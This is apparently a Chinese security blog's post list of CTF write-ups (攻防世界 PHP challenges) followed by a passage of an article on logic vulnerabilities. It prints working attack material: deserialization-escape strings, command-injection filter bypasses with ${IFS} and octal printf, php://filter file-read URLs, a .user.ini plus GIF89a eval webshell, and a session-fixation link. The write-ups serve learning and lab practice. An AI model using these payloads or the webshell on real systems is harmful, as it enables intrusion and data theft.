if(!preg_match('/^\\d{11}$/', $_POST['phone'])) die('Invalid phone'); if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email'])) die('Invalid email'); if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); $file = $_FILES['photo']; if($file['size'] &lt; 5 or $file['size'] &gt; 1000000) die('Photo size error'); move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name'])); $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $user-&gt;update_profile($username, serialize($profile)); echo 'Update Profile Success!&lt;a href=\"profile.php\"&gt;Your Profile&lt;/a&gt;'; } else { ?&gt; 对于用户post进入的数据进行正则匹配的检测，其中还有serialize敏感函数 4. profile.php &lt;?php require_once('class.php'); if($_SESSION['username'] == null) { die('Login First'); } $username = $_SESSION['username']; $profile=$user-&gt;show_profile($username); if($profile == null) { header('Location: update.php'); } else { $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo'])); ?&gt; 先反序列化profile，之后拿到phone等数据，最后利用file_get_contents敏感函数读取photo文件，并编码，这里大概就是漏洞点。 5. class.php &lt;?php $config['hostname'] = '127.0.0.1'; $config['username'] = 'root'; $config['password'] = ''; $config['database'] = ''; $flag = ''; ?&gt; 数据库的一些配置，不过显示了flag，那很明显我们要与file_get_contents配合读取config.php，进而得到flag 那么对应一下页面 代码呢，会对我们在此页面传入的数据进行相应的正则匹配，不用想，这里便需要我们去绕过了，那看一下关键代码 这里可以看到其重点防守了nickname，再看一下update_profile函数 发现一个filter函数的检测，跟踪看一下 发现对一些敏感且危险的字符进行了过滤，会将其替换为hacker，这里估计就可以想到反序列化的字符串逃逸了 我们先构造payload看看： &lt;?php class b { public $phone = \"12345678901\"; public $email = \"123@qq.com\"; public $nickname = \"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\"; public $photo = \"config.php\"; } $a=new b(); $profile = serialize($a); echo $profile; ?&gt; O:1:\"b\":4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:10:\"222@qq.com\";s:8:\"nickname\";s:6:\"where\";s:5:\"photo\";s:10:\"config.php\";} 由于where会转换为hacker，而且那几个均是五个字符，我们利用where+字符串逃逸看看 那么这里变换以后字符串会变长，那我们应该就是让前面的把我们想要的逃逸出去，这里取出关键的看看 \";}s:5:\"photo\";s:10:\"config.php\";} //34个字符 很明显我们需要写34个where即可，然后剩下的34个字符就不会被正则匹配，即下面代码，在反序列化时就会被成功当成photo，那么我们就可以成功读取到config.php了，构造如下poc O:1:\"b\":4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:10:\"222@qq.com\";s:8:\"nickname\";s:170:\"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";s:5:\"photo\";s:10:\"config.php\";} 在此基础上要在photo前面的s前加一个花括号，以达到闭合的效果 O:1:\"b\":4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:10:\"222@qq.com\";s:8:\"nickname\";s:170:\"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";} 注意上图的检测，preg_match只能处理字符串，当传入的subject是数组时会返回false，并且strlen处理数组的时候也会返回false 因此我们bp抓包看看 做如图的修改即可放包即可成功update 查看源代码，base64解码即可","categories":["内部竞赛"]},{"title":"攻防世界-unseping","path":"/2023/08/06/unseping/","content":"题目描述： unseping 题目解题： 一道知识点挺多的《简单题》-.- 代码复杂程度不算高，直接开审 &lt;?php highlight_file(__FILE__); class ease{ private $method; private $args; function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct(){ if (in_array($this-&gt;method, array(\"ping\"))) { call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } } function ping($ip){ exec($ip, $result); var_dump($result); } function waf($str){ if (!preg_match_all(\"/(\\||&amp;|;| |\\/|cat|flag|tac|php|ls)/\", $str, $pat_array)) { return $str; } else { echo \"don't hack\"; } } function __wakeup(){ foreach($this-&gt;args as $k =&gt; $v) { $this-&gt;args[$k] = $this-&gt;waf($v); } } } $ctf=@$_POST['ctf']; @unserialize(base64_decode($ctf)); ?&gt; 找到敏感函数exec，查看一下用法 也就是说该函数执行第一个参数的命令后，将内容填充到第二个参数，这样与var_dump配合，将成功输出命令执行后的内容。 接着又看到call_user_func_array函数，看一下用法 意思是该函数会把第一个参数当做一个函数调用，并传入第二个参数作为该调用函数的参数，且第二个参数还得是数组，那很明显我们需要让method=ping来调用ping函数，args就作为函数参数来传入，不出所料就要赋值为ls，cat等等，紧接着看到__wakeup方法，对args数组的内容通过foreach循环做了waf处理，那我们看一下waf函数 preg_match_all(\"/(\\||&amp;|;| |\\/|cat|flag|tac|php|ls)/\") 也就是过滤了|, &amp;, ;, 空格 ``, /以及cat, flag, tac, php, ls字符 绕过也挺简单，空格利用&lt;, &lt;&gt;, &gt;, ${IFS}等，敏感字符配合单双引号，\\符等，那这里我们先让args=array(“l\\s”)，来查看一下有什么文件 直接上poc(这里注意题目中的参数属性为私有，为了防止敏感字符我们将其改为public即可) &lt;?php class ease{ public $method; public $args; function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; } function __destruct(){ } function ping($ip){ } function waf($str){ } function __wakeup(){ } } //(!preg_match_all(\"/(\\||&amp;|;| |\\/|cat|flag|tac|php|ls)/\", $str, $pat_array)) $a = new ease(\"ping\", array('l\\s')); $a = serialize($a); echo $a; echo'&lt;/br&gt;'; echo base64_encode($a); ?&gt; 这里发现flag所在地，当时试了半天一直cat出不来，以为是哪里出问题，看了wp才知道，这里是一个文件夹。。。。。 那我们继续用ls，读取看看 将上述改为array(‘l\\s${IFS}f\"\"lag_1s_here’) 发现flag所在地，这里也有一个疑问，当时我array()里面用的双引号包裹，然后flag之前用单引号隔开，缺一直行不通，不清楚啥原因，或许是格式吗？ 随后令其等于array(‘ca\"\"t flag_1s_here/flag_831b69012c67b35f.php’)，但很明显/被过滤了，这里也不知道如何处理，参考wp发现可以用oct命令 oct 绕过命令执行 $(printf \"\\154\\163\")//ls命令，这个编码后可以拼接 需注意，符号都为英文状态下 此时我们需要执行命令为cat flag_1s_here/flag_831b69012c67b35f.php $(printf “cat flag_1s_here/flag_831b69012c67b35f.php”) 编写脚本对命令进行ascii编码然后八进制转换 这里也是借用脚本，不太会写。。。 str1 = \"cat flag_1s_here/flag_831b69012c67b35f.php\" arr = [] for i in str1: //对字符先转换为ASCII码，再转换为八进制 lett = oct(ord(i)) //这个主要是为了将八进制前面的0o替换掉 lett=str(lett).replace(\"0o\",\"\") arr.append(lett) sym = \"\\\\\" # print(arr) //将所有的八进制组合，最终的结果第一个地方应该再添加一个\\ ccc=sym.join(arr) print(ccc) 获取到编码后直接用poc获得payload,空格运用${IFS}绕过即可 &lt;?php class ease{ public $method; public $args; function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; } } $a = new ease(\"ping\",array('$(printf${IFS}\"\\143\\141\\164\\40\\146\\154\\141\\147\\137\\61\\163\\137\\150\\145\\162\\145\\57\\146\\154\\141\\147\\137\\70\\63\\61\\142\\66\\71\\60\\61\\62\\143\\66\\67\\142\\63\\65\\146\\56\\160\\150\\160\")')); $b = serialize($a); echo $b; echo'&lt;/br&gt;'; echo base64_encode($b); ?&gt; 参考文章： 参考wp RCE绕过姿势参考","categories":["攻防世界"]},{"title":"攻防世界-file_include","path":"/2023/08/02/gong-fang-shi-jie-file-include/","content":"题目描述： 怎么读取文件呢？ 题目解题： 简单的PHP代码 &lt;?php highlight_file(__FILE__); include(\"./check.php\"); if(isset($_GET['filename'])){ $filename = $_GET['filename']; include($filename); } ?&gt; 以为题目很简单，我直接尝试php://filter协议读取源代码，却发现做了waf，于是蒙了，所以参考了大佬的wp 思路就是根据题目逐步猜测其过滤的内容，输入如下两个payload发现： http://61.147.171.105:64434/?filename=php://fil1ter/con1vert.ba1se64-e1ncode/resource=index.php http://61.147.171.105:64434/?filename=php://filter/convert.base64-e1ncode/resource=index.php 第一个payload，提示不见了，第二个payload依然有提示，说明base64-encode关键词被过滤；直接在网上搜文件包含绕过base64-encode,最终找到了convert.iconv.* 绕过. convert.iconv.* 绕过 这个过滤器需要php支持iconv，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。 iconv — 字符串按要求的字符编码来转换 convery.iconv.*的使用有两种方法: convert.iconv.. convert.iconv./ 和就是编码方式，有如下几种(以下不全)： 1 UCS-4* 2 UCS-4BE 3 UCS-4LE* 4 UCS-2 5 UCS-2BE 6 UCS-2LE 7 UTF-32* 8 UTF-32BE* 9 UTF-32LE* 10 UTF-16* 11 UTF-16BE* 12 UTF-16LE* 13 UTF-7 14 UTF7-IMAP 15 UTF-8* 16 ASCII* 17 EUC-JP* 18 SJIS* 19 eucJP-win* 20 SJIS-win* 21 ISO-2022-JP 22 ISO-2022-JP-MS 23 CP932 24 CP51932 25 BASE64 具体可参考官方手册https://www.php.net/manual/en/mbstring.supported-encodings.php 本题中我们逐个进行尝试，最终尝试http://61.147.171.105:64434/?filename=php://filter//convert.iconv.SJIS*.UCS-4*/resource=index.php可以进行绕过。 通过读取index.php，发现没有提示文字。 读取check.php，发现过滤文件 直接读取flag.php看看，成功得到 参考文章： 基础PHP伪协议知识参考 wp参考","categories":["攻防世界"]},{"title":"攻防世界-easyphp","path":"/2023/08/02/gong-fang-shi-jie-easyphp/","content":"题目描述： easyphp 题目解题： 一道《简单的》PHP特性题 代码有点高深，对于菜鸡的我，有点审不过来，就能申的就申 &lt;?php highlight_file(__FILE__);//高亮文件 $key1 = 0; $key2 = 0; $a = $_GET['a']; //同下，get传参 $b = $_GET['b']; if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3){//如果a不为空，且a取证大于指定数字，长度小于3进入下一步 if(isset($b) &amp;&amp; '8b184b' === substr(md5($b),-6,6)){ //如果b存在，且b的md5编码的指定部分等于指定字符串，进入下一部 $key1 = 1; //将该变量赋值为1 }else{ die(\"Emmm...再想想\"); } }else{ die(\"Emmm...\"); } $c=(array)json_decode(@$_GET['c']); //接受一个 JSON 编码的字符串C并且把它转换为 PHP 值写到数组array中 if(is_array($c) &amp;&amp; !is_numeric(@$c[\"m\"]) &amp;&amp; $c[\"m\"] &gt; 2022){//如果C是数组，且$c[\"m\"]不是数字或数字字符串且$c[\"m\"]大于2022 if(is_array(@$c[\"n\"]) &amp;&amp; count($c[\"n\"]) == 2 &amp;&amp; is_array($c[\"n\"][0])){//如果c[\"n\"]是数组 且c[\"n\"]的元素值为2 且$c[\"n\"][0])是数组 $d = array_search(\"DGGJ\", $c[\"n\"]);//d在数组c[\"n\"]中搜索\"DGGJ\"，如果匹配成功返回键值 $d === false?die(\"no...\"):NULL;//d 为 false的话，挂掉，输出no... foreach($c[\"n\"] as $key=&gt;$val){//检查数组c[\"n\"] $val===\"DGGJ\"?die(\"no......\"):NULL;//如果c[\"n\"]是\"DGGJ\"，挂掉，输出no...... } $key2 = 1;//赋值key2=1； }else{ die(\"no hack\"); } }else{ die(\"no\"); } if($key1 &amp;&amp; $key2){//若这两个变量存在，则回显flag include \"Hgfks.php\"; echo \"You're right\".\" \"; echo $flag; } ?&gt; Emmm... 1 根据第9行 if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3) 在变量a中写入整数值大于6000000且长度小于3的字符串。 2 根据第10行 if(isset($b) &amp;&amp; '8b184b' === substr(md5($b),-6,6)) 在变量b中写入末尾md5为'8b184b'的字符串，我在印象里有MD5碰撞专用的网站； 3 根据第20行 if(is_array($c) &amp;&amp; !is_numeric(@$c[\"m\"]) &amp;&amp; $c[\"m\"] &gt; 2022) 在数组c的成员m中写入不是数字或数组字符串且值大于2022的 4 根据第21行 if(is_array(@$c[\"n\"]) &amp;&amp; count($c[\"n\"]) == 2 &amp;&amp; is_array($c[\"n\"][0])) 在数组c的成员n中写入元素值为2且c[\"n\"][0])是数组的 5 根据第22行 $d = array_search(\"DGGJ\", $c[\"n\"]); 如果\"DGGJ\"与$c[\"n\"]）的搜素结果匹配，且c[\"n\"]不可以是\"DGGJ\"本身 6 根据第19行 $c=(array)json_decode(@$_GET['c']); 数组c除了上述要求外，还需要是JSON 编码。 第一个：查看官方文档发现1e10数字很大，但要求我们长度小于4，那我们试试1e9 很明显可以的，成功绕过 第二个：应该是md5碰撞，不过这里写脚本更合适，但太菜了，就看看大佬如何写的吧 &lt;?php for($b=1;$b&lt;=100000;$b++){ //b从1到100000 if(preg_match('/^8b184b/',substr(md5($b),-6,6))){ //匹配md5b的末尾为8b184b echo $b; //输出b echo \" \"; echo md5($b); //输出md5 echo \" \"; } } ?&gt; 代码也很简单（但我依旧想不到-.-）采用一个简单的正则表达式，如果匹配则输出b，我们运行一下看看 第三个：if(is_array($c) &amp;&amp; !is_numeric(@$c[“m”]) &amp;&amp; $c[“m”] &gt; 2022) 首先我们知道c是一个数组，且有两个元素即c=array(‘m’,‘n’); 先套用JSON编码运行一遍，就是把c[“m”]='9001 '写成c={“m”:“9001a”}；这里注意双引号，因为根据官方教程，写单引号JSON是不正确的 第四个与第五个：if(is_array(@$c[\"n\"]) &amp;&amp; count($c[\"n\"]) == 2 &amp;&amp; is_array($c[\"n\"][0])) $d = array_search(\"DGGJ\", $c[\"n\"]); array_search绕过可以参考博文：CTF中常见的 PHP 弱类型漏洞总结 - 北极边界安全团队 - 博客园 (cnblogs.com) 示例代码如下： &lt;?php if(!is_array($_GET['test'])){exit();} $test=$_GET['test']; for($i=0;$i&lt;count($test);$i++){ if($test[$i]===\"admin\"){ echo \"error\"; exit(); } $test[$i]=intval($test[$i]); } if(array_search(\"admin\",$test)===0){ echo \"flag\"; } else{ echo \"false\"; } ?&gt; 这段代码的意思就是先判断是不是数组，然后在把数组中的内容一个个进行遍历，所有内容都不能等于admin,类型也必须相同，然后转化成int型，然后再进行比较如果填入值与admin相同，则返回flag,如何绕过呢？ 基本思路还是不变，因为用的是三个等于号，所以说“= =”号这个方法基本不能用，那就用第二条思路，利用函数接入到了不符合的类型返回“0”这个特性，直接绕过检测。所以payload：test[]=0。 ​\t因此这道题我们可以 我们直接为c[n0]赋予空值数组，保证可以通过is_array($c[“n”][0])的判定，c[n1]赋予空值，即c=[[],0];0的话，由于这里是强比较那么0肯定不等于false，便成功绕过 最终c赋值为c={\"m\":\"9001 \",\"n\":[[0],0]} payload为： ?a=1e9&amp;b=53724&amp;c={\"m\":\"9001 \",\"n\":[[0],0]} 得到flag 参考文章： wp参考","categories":["攻防世界"]},{"title":"攻防世界-fileclude","path":"/2023/08/02/gong-fang-shi-jie-fileclude/","content":"题目描述： 好多file呀！ 题目解题： 依旧是一个文件上传，我们进行代码审计 WRONG WAY! &lt;?php include(\"flag.php\"); highlight_file(__FILE__); if(isset($_GET[\"file1\"]) &amp;&amp; isset($_GET[\"file2\"])) { $file1 = $_GET[\"file1\"]; $file2 = $_GET[\"file2\"]; if(!empty($file1) &amp;&amp; !empty($file2)) { if(file_get_contents($file2) === \"hello ctf\") { include($file1); } } else die(\"NONONO\"); } 流程为如果get传参file1与file2并且其中的file2参数等于hello ctf，则包含include，否则退出程序 很明显变量file2可以采用php://input协议绕过，且内容为指定内容，变量file1我们采取PHP伪协议读取源码即可，这里已经有提示要我们读取flag.php文件 payload如下： ?file1=php://filter/convert.base64-encode/resource=flag.php&amp;file2=php://input 这里file2的内容要用bp抓包添加hello ctf，直接用hackbar无法成功，因为在post栏中的内容要为键值对的形式方可执行 如图成功得到flag，base64解码即可 参考文章： wp可参考","categories":["攻防世界"]},{"title":"攻防世界-fileinclude","path":"/2023/08/02/gong-fang-shi-jie-fileinclude/","content":"题目描述： 无 题目解题： 简单的文件包含题目，但是我刚看到该页面的时候一脸懵，代码呢？？？，看了看wp发现最基本的查看源代码步骤忘了… 我们开始审计代码，这道题就是让我们设置一个language变量的cookie并将其值传给lan，如果该lan变量存在，我们就可以包含一个可控的php文件，很明显这里我们令lan为读取响应文件源码的代码即可，payload如下： language=php://filter/convert.base64-encode/resource=flag //字符串拼接即可构造处flag.php base64解码即可 拿到flag 参考文章： 复现参考： PHP伪协议知识参考：","categories":["攻防世界"]},{"title":"攻防世界-easyupload","path":"/2023/08/02/easyupload/","content":"题目描述： 一名合格的黑客眼中，所有的上传点都是开发者留下的后门 题目解题： 这题解释长知识了（还是太菜~） 首先毕竟是新手题目，于是自己摸索了一会儿，首先就是上传shell.php发现失败，猜测肯定是过滤了php后缀啥的，暂不考虑后缀名绕过了，这有点太小儿科了，随后bp抓包修改了php后缀发现仍然没用，那肯定就是会检测文件内容的，之后尝试了一个很正常的jpg图片，成功上传，这提示我们文件类型也得正确（这也是后续要绕过的），之后尝试了图片马，依旧错误，更加确定会检测文件内容。之后尝试特殊的文件如.htaccess文件与.usr.ini文件，前者上传失败，而后者返回如下图的信息 这表明这个路线有说法，这里信息告诉我们文件类型有问题，当时只是觉得修改type类型即可，但还是会失败，然后我就知识盲区了，随后看了wp，发现这道题会检测文件头，文件头符合图片文件类型的才可以。 开始解题 参考wp发现： 本题的主要考点为利用fastcgi的.user.ini特性进行任意命令执行 这里需要绕过的点如下 检查文件内容是否有php字符串 检查后缀中是否有htaccess或ph 检查文件头部信息 文件MIME类型 对于第一点可以利用短标签绕过，例如 这里补充一下知识： php中最常见的标签为 &lt;?php @eval($_POST['a']);?&gt; 不过在题目上传时可能会被waf过滤掉php关键字。根据查询结果，还有四种php的标签，分别是： ① 仅在配置short_open_tag=on时可以使用，适合执行php语句； ②即使配置short_open_tag=off时依然可以使用，相当于，适合输出php语句~ 上述二者的短标签都不必闭合（即?&gt;可以省略不写，也可以连接成功）~ &lt;? @eval($_POST['a']);?&gt; &lt;?= @eval($_POST['a']);?&gt; &lt;? @eval($_POST['a']); &lt;?= @eval($_POST['a']); ③&lt;% %&gt; 据说需要配置php.ini文件中asp_tags=on（php.ini默认状态下是关闭的），但该作者未在php.ini中找到该选项… ④ php7及之后官方就已经不支持的写法 php短标签参考1：php中的短标签 太坑人了 - dongguol - 博客园 (cnblogs.com) php短标签参考2：无字母数字webshell总结 - 先知社区 (aliyun.com) 对于第二点可以通过上传.user.ini以及正常jpg文件来进行getshell,可以参考以下文章 https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html 在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。 这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。 其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。 第三点绕过方式即在文件头部添加一个图片的文件头，比如GIF89a 图片马需要在.php文件前增加文件头，上传时偶尔需要配合burpsuite抓包修改content-type，常见图片搭配格式如下表所示： 文件格式 php 文件头 content-type .jpg .jpe .jpeg JPGGraphic File image/jpeg .png PNG Image File image/png .gif GIF 89A image/gif 若题目要求上传其他格式的文件，如doc、pdf、dwg等，可以参考下面的博文： 图片马参考1：文件头_iqiqiya的博客-CSDN博客_gif文件头 图片马参考2：Content-type_瀚忄的博客-CSDN博客 第四点绕过方法即修改上传时的Content-Type 因此最终的payload为：上传.user.ini，内容为 GIF89a auto_prepend_file=a.jpg 上传a.jpg，内容为 GIF89a &lt;?=eval($_POST['cmd']);?&gt; 这里也涨知识了，在文件内容头部添加GIF89a居然也可以？ 接着上传图片马 F12查看文件去向，原因是你上传的图片马会被该网站同目录下的正常php文件所包含，因此你要知道你在上传图片之后，被哪个php文件包含 接着我们蚁剑连接即可 成功找到flag 当然我们也可以访问该网址进行手动探索 成功找到flag，在这里也遇到个神奇的问题，我在上传一段时间后，该木马文件失效了，这里也不知道是何原因 参考文章： 复现wp 基础知识文章参考","categories":["攻防世界"]},{"title":"逻辑漏洞","path":"/2023/07/29/qian-xi-luo-ji-lou-dong/","content":"浅析逻辑漏洞 1. 漏洞介绍 1.1 成因 设计阶段产生，老司机也会产生、相对难发现、难以防护，相对容易利用 第三方逻辑缺陷、没有在设计初期进行安全审计、安全水平及对安全认知程度不一致 逻辑漏洞是指由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误，一般出现任意密码修改（没有旧密码验证）、越权访问、密码找回、交易支付金额等。 ​ 逻辑漏洞是指攻击者利用业务/功能上的设计缺陷，获取敏感信息或破坏业务的完整性, 逻辑漏洞的破坏方式并非是向程序添加破坏内容，而是利用逻辑处理不严密或者代码问题或固有不足，操作上并不影响程序的允许，在逻辑上是顺利执行的。 这种漏洞一般防护手段或设备无法阻止，因为走的是合法流量也没有防御标准。 1.2 分析 ​ 对常见的漏洞进行过统计，发现其中越权操作和逻辑漏洞占比最高，很多平台中基本都有发现，包括任意查询用户信息、任意删除等行为；最严重的漏洞出现在账号安全，包括重置任意用户密码、验证码暴力破解等。 逻辑漏洞的重要性 常见的OWASP漏洞，通过漏洞扫描工具，大多支持自动化或者半自动化扫描出来，并且传统的安全设备或者防护措施收效甚微 ​ 但逻辑漏洞是和系统自身功能和逻辑有关系的漏洞，每一家的漏洞出现可能存在一定的独特性，很难复制或者通过规则脚本和漏扫工具扫描出来，因此逻辑漏洞大多需要配合代码审计和手段测试才可以发现相关漏洞，也是工具无法代替人工的漏洞。 2. 逻辑漏洞详解 2.1 常见的逻辑漏洞 逻辑漏洞的分类 越权漏洞 密码需改 密码找回 验证码漏洞 支付漏洞 投票/积分/抽奖 短信轰炸 即：交易支付、密码修改、密码找回、越权修改、越权查询、突破限制等各类逻辑漏洞。 2.2 如何挖掘逻辑漏洞 确定业务流程---&gt;寻找流程中可以被操控的环节---&gt;分析可被操控环节中可能产生的逻辑问题---&gt;尝试修改参数触发逻辑问题 2.3 身份验证漏洞 1. 暴力破解漏洞 漏洞介绍：攻击者可以通过该漏洞获取用户名和对应弱口令密码，并进行登录操作 漏洞原理：由于没有设置登录失败次数限制，导致攻击者可以通过口令字典进行特定用户的密码爆破或通过用户名字典进行特定弱口令的用户枚举 漏洞点：系统登录点 漏洞修复： 对于固定用户名爆破密码 可以针对用户名进行错误次数计算，高于一定阈值账号锁定一段时间，或者添加验证码 但是不能永久锁定，可能被用来进行账户恶意锁定 对于固定密码枚举用户名、 需要计算IP对URL的请求情况，某个IP短时间大量请求登录应该加入黑名单 进行传输数据加密有一定的防护效果 2. Session固定攻击 漏洞介绍：会话固定攻击是利用服务器的session不变机制，借他人之手获得认证和授权，然后冒充他人 漏洞原理：在请求登录过程时候，URL带有一个session，登录成功之后会将登录成功的信息绑定到这个session中，攻击者可以发送带有session的URL给相关工作人员诱导其登录，相当于获取了其身份信息 攻击流程： 1、攻击者Attacker能正常访问该应用网站； 2、应用网站服务器返回一个会话ID给他； 3、攻击者Attacker用该会话ID构造一个该网站链接发给受害者Victim； 4-5、受害者Victim点击该链接，携带攻击者的会话ID和自己的用户名密码正常登录了该网站，会话成功建立； 6、攻击者Attacker用该会话ID成功冒充并劫持了受害者Victim的会话。 这里相当于受害者用该会话ID登录后，便将该会话ID提权为管理员了，而我们攻击者凭借该会话ID去登录该网站时，成功以管理员的身份进入，当然这里受害者是普通用户也是可以的 漏洞点：在GET方法请求登录时候带有session值 访问网站（未登录）：获取cookie信息，获取sessionid 登录网站：查看cookie信息，获取sessionid 查看登录前，登录后sessionid是否相同，若相同，则存在该漏洞 修复思路： 只要避免在URL中带入session信息即可比较有效的防御 另外也要注意POST请求中带有sessionid进行session固定攻击，虽然可利用性比较低，但是建议修复 漏洞实战 这里用YXcms建站系统复现，由于源代码太难找了，这里就跟着走吧… 复现过程 yxcms允许我们自定义session，而且这个过程通过get方式来完成。我觉得这样的问题属于CSRF，不经意之间就能获取大效果。其问题代码如下： &lt;?php&lt;br&gt; //公共类&lt;br&gt; class commonController extends baseController{public function __construct()&lt;br&gt; {&lt;br&gt; parent::__construct();&lt;br&gt; if(!empty($_GET['phpsessid'])) session_id($_GET['phpsessid']);//通过GET方法传递sessionid,firefox&lt;br&gt; session_starts();&lt;br&gt; …… 当$_GET[‘phpsessid’]非空时，就令session_id为我们传入的值。 于是我们构造一个链接让管理员点击，管理员点击后会重新设置他的session，而且这个session就是我们构造的。因为session重置了所以管理员也需要重新登录，而重新登录后其session_id就是我们构造的。我们只要利用这个session_id就能登录管理后台了。 比如我构造一个链接： http://192.168.36.140/yxcms/index.php?r=admin/index/index&amp;phpsessid=f4cking456 将这个链接发给受害者（火狐浏览器），诱使受害者管理员点击该链接，点击后后会跳转到登录页面，但此时他的phpsession已经是我们构造的f4cking456了 此时如果受害者登录这个网址，那么这个session就有后台权限了。 假如受害者登录该网址 那么我们利用这个链接 http://192.168.36.140/yxcms/index.php?r=admin/index/index&amp;phpsessid=f4cking456，将自己的session设置成f4cking456，或者随意怎么修改，只要把phpsessid修改成f4cking123就能拥有后台权限了 这时攻击者（谷歌浏览器）访问该链接，直接进入后台界面 有个前提就是，实战过程中你需要知道该网站后台地址是什么 3. Cookie欺骗漏洞 漏洞介绍：通过伪造cookie信息能够伪造其他用户进行登录。 漏洞原理：开发者为了方便将身份信息/登录信息明文或者只是简单编码、哈希之后存放在cookie中，网站通过获取得到的cookie进行授权或者身份验证 漏洞点：cookie中有明显或者只是简单编码、哈希的字段时候 修改lsLogin值为1可以判定为用户已经登录 修改cookie为asp163=UserName=admin 漏洞修复： Cookie不应该存储可理解的身份信息和登录信息 按照规定，cookie对身份信息和登录信息的存储只能通过存储足够长度的随机字符串进行，避免篡改 漏洞实战 大体就是通过某种手段获取其他用户或者管理员的cookie，而由于该cookie存储的是可理解的身份信息和登录信息，则攻击者获取该cookie后，凭借该cookie登录网站便可以实现免密登录到其他用户或者管理员页面 2.4 权限类逻辑漏洞 权限相关逻辑漏洞是逻辑漏洞中出现的最多的漏洞 1. 平行权限跨越 漏洞介绍：即普通用户/管理员能访问其他普通用户/管理员才能够访问的系统信息或者系统功能 形成原因：在进行方法调用时候未进行请求用户和目标信息拥有者是否匹配一致，直接用userid/email之类的容易遍历的参数进行数据库查询 漏洞点：在普通用户/管理员登录后的能访问的链接或者功能中都可能存在 漏洞修复： 在权限管理中，平行越权的权限管理颗粒度最小 需要在方法中进行相关的获取请求request，再利用getAttribute(“userid”)获取其userid，直接使用该userid作为参数进行数据增删查改，避免userid参数传输 漏洞复现 登录，同时bp抓包： 放包，可以看到当前的test用户（这里放包了很多次…） 在这里可以看到这个card_id对应的就是每个用户对应的id 发送到爆破模块遍历一下，这里他是对后两位进行的遍历 然后来到登录界面，右键查看马春生的图片，检查源代码属性：发现其id尾号以16结尾，我们开始爆破 这里就是马春生的个人信息 我们将密码拿去md5破解一下 随后凭借该用户名和密码登录即可，成功拿到key 漏洞总结 先公布一下背景 钻石代理商马春生同学卷款逃跑，多位下级代理内心受到了难以磨灭的伤害，为了找到她我们将通过代理网站获取到她的手机号码等信息。 这里我也是跟着教程做的，因此几乎没有自己的思考，为了不摸鱼，还是浅浅总结一下 题目告知我们重点是马春生，那我们便要实现水平越权以便以马春生的用户信息登录网站，那我们进入靶场（我尽可能的以实战的思路来吧），首先就是搜集信息，burp抓包，F12这些肯定是少不了的，这里也是学到了一点东西，搜集信息尤为重要 这里在实战中就是会费时间，这里我陈述的也就是凭借答案来陈述吧，所以会参考性低一些 我们burp抓包，然后观察抓到的东西，一次次放包查看什么时候会有重要信息，随后我们在放包的过程中，很幸运在url头发现了有关证明用户信息的id，并且联系我们之前对页面的那些图片的查看，发现图片的src处有一堆数字，这与我们发现的用户id及其相似，那我们有理由推断那就是马春生同学的用户id，但我们只能了解到这里，想要获取他的用户名密码便无从下手，于是我们通过burp的爆破模块，对用户id后两位进行遍历，成功在id=16处（也就是马春生同学的id）发现了马春生的详细个人信息，至此我们成功实现水平越权（服务端没有对用户id做出精确的维护） 2. 垂直权限跨越 漏洞介绍：即普通用户能够访问管理员甚至超级管理员才能够访问的系统信息或者系统功能 形成原因：程序在方法调用时候，缺少角色等级校验 漏洞点：在任何用户登录后才能访问的链接或者功能中都可能存在 对每一个传输的参数都要了解参数的目的，尝试将用户名改为admin尝试绕过 漏洞修复： 需要校验用户是否有权限访问这个方法 获取请求request，再利用getAuttribute(“roleid”)获取其角色等级，检查角色等级是否合法，错误则直接返回错误跳转，返回页面必须仍然从Attribute中获取userid再进一步查询相关信息，值得注意的是切勿将错误跳转写到Javascript里面，还返回目标URL页面的相关信息。 Couchdb 垂直越权（CVE-2017-12635） Couchdb简介 Apache CouchDB是一个开源数据库，专注于易用性和成为\"完全拥抱web的数据库\"。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。 ​ 在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。 ​ 影响版本：Apache CouchDB before 